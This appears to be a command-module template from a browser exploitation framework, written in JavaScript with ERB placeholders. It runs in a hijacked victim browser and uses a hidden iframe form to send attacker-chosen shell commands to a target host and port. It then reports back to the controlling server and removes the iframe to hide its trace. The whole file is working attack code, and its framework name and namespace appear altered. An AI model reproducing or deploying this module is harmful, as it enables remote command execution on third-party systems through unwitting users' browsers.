//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	// validate payload
	try {
		var cmd = '<%= @commands.gsub(/'/, "\\\'").gsub(/"/, '\\\"') %>';
	} catch(e) {
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=malformed payload: '+e.toString());
		return;
	}

	// validate target host
	var rhost = "<%= @rhost %>";
	if (!rhost) {
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target host');
		return;
	}

	// validate target port
	var rport = "<%= @rport %>";
	if (!server.net.is_valid_port(rport)) {
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=invalid target port');
		return;
	}

	// validate timeout
	var timeout = "<%= @timeout %>";
	if (isNaN(timeout)) timeout = 30;

	// send commands
	var win_ipec_form_<%= @command_id %> = server.dom.createIframeIpecForm(rhost, rport, "/index.html?&cmd&", cmd + " & exit");
	server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Shell commands sent');

	// clean up
	cleanup = function() {
		document.body.removeChild(win_ipec_form_<%= @command_id %>);
	}
	setTimeout("cleanup()", timeout * 1000);

});

